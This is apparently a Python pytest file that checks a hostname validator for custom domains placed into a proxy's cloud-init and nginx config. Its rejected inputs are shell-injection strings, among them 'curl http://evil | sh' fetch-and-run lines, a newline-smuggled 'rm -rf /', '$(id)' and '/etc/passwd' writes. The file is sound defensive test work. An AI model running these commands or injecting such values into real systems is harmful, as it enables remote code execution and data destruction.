# Licensed to the Apache Software Foundation (ASF) under one or more
# contributor license agreements. See the NOTICE file distributed with this
# work for additional information regarding copyright ownership. The ASF
# licenses this file to you under the Apache License, Version 2.0 (the
# "License"); you may not use this file except in compliance with the
# License. You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.
"""A private endpoint's custom domain has to be a hostname.

It is interpolated into the proxy's cloud-init — into a `runcmd`
string entry, which cloud-init runs through a shell, and into the
nginx `server_name`. Nothing constrained its shape, so a value
carrying `;` or a newline escaped both. The command that sets it is
granted to every role.

The value is checked where it arrives and again where it is stored,
because the two have different callers: the API body guards the HTTP
route, `validate_exposure` guards anything that reaches the store by
another path.
"""

from __future__ import annotations

import pytest

from aisvc.endpoints import ExposureRejected, valid_hostname


class TestWhatCountsAsAHostname:
    @pytest.mark.parametrize(
        "name",
        [
            "ai.example.com",
            "a.co",
            "deep.sub.domain.example.org",
            "with-hyphens.example.com",
            "digits123.example.com",
            "AI.EXAMPLE.COM",
        ],
    )
    def test_ordinary_names_are_accepted(self, name: str) -> None:
        assert valid_hostname(name)

    @pytest.mark.parametrize(
        "name",
        [
            "x.example.com; curl http://evil/x | sh",
            "x.example.com\nbootcmd:\n  - rm -rf /",
            "x.example.com && reboot",
            "$(id).example.com",
            "`id`.example.com",
            "x.example.com | tee /etc/passwd",
            "../../etc/passwd",
            "x.example.com\x00",
            "no-dot",
            "",
            "-leading.example.com",
            "trailing-.example.com",
            ".example.com",
            "x..example.com",
            "x.example.com.",
            "a" * 64 + ".example.com",
            ("a." * 130) + "example.com",
        ],
    )
    def test_anything_else_is_refused(self, name: str) -> None:
        assert not valid_hostname(name)


class TestTheExposureRefusesOne:
    def exposure(self, domain: str):  # type: ignore[no-untyped-def]
        from aisvc.endpoints import EndpointExposure, TlsSource

        return EndpointExposure(
            deployment="llama",
            account="acme",
            domain="/Customers/Acme",
            network_id="net-1",
            public_enabled=True,
            custom_domain=domain,
            tls=TlsSource.ACME,
        )

    def test_a_shell_metacharacter_is_refused(self) -> None:
        with pytest.raises(ExposureRejected) as raised:
            from aisvc.endpoints import validate_exposure

            validate_exposure(
                self.exposure("x.example.com; curl http://evil | sh"),
                owned_networks=["net-1"],
            )

        assert "custom_domain" in str(raised.value) or "hostname" in str(raised.value)

    def test_a_newline_is_refused(self) -> None:
        from aisvc.endpoints import validate_exposure

        with pytest.raises(ExposureRejected):
            validate_exposure(
                self.exposure("x.example.com\nbootcmd: [rm -rf /]"),
                owned_networks=["net-1"],
            )

    def test_an_ordinary_domain_still_passes(self) -> None:
        from aisvc.endpoints import validate_exposure

        assert validate_exposure(self.exposure("ai.example.com"), owned_networks=["net-1"])

    def test_no_custom_domain_is_still_fine(self) -> None:
        from aisvc.endpoints import validate_exposure

        assert validate_exposure(self.exposure(""), owned_networks=["net-1"])
